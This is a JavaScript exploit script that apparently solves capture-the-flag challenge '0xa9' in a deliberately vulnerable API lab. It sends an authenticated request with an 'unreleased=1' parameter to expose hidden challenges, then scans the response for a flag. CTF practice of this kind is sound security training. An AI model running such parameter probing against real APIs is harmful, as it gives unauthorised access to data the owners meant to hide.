/**
 * Challenge: 0xa9 - Improper Inventory Management
 * Exploit: Access /api/allChallenges with unreleased=1
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa9');
    log('Starting 0xa9 exploit: Improper Inventory Management');

    log('Accessing unreleased challenges via /api/allChallenges...');
    const result = await httpRequest(`${baseUrl}/api/allChallenges`, {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
            unreleased: 1,
        }),
    });

    log(`Challenges response: ${JSON.stringify(result.data)}`);

    // Check if flag is in response
    let flag = extractFlag(JSON.stringify(result.data));
    if (flag) {
        saveFlag(flag);
        return { success: true, flag };
    }

    // Check if unreleased challenges are accessible
    if (result.data && result.data.challenges) {
        log('✅ Exploit successful - accessed unreleased challenges');
        
        // Flag might be in the challenge description
        const challenges = result.data.challenges;
        for (const challenge of challenges) {
            if (challenge.shortDescription) {
                flag = extractFlag(challenge.shortDescription);
                if (flag) {
                    log(`✅ FLAG FOUND in challenge description: ${flag}`);
                    saveFlag(flag);
                    return { success: true, flag };
                }
            }
        }
        return { success: true };
    }

    log('❌ Exploit may have failed');
    return { success: false };
}

module.exports = { run };
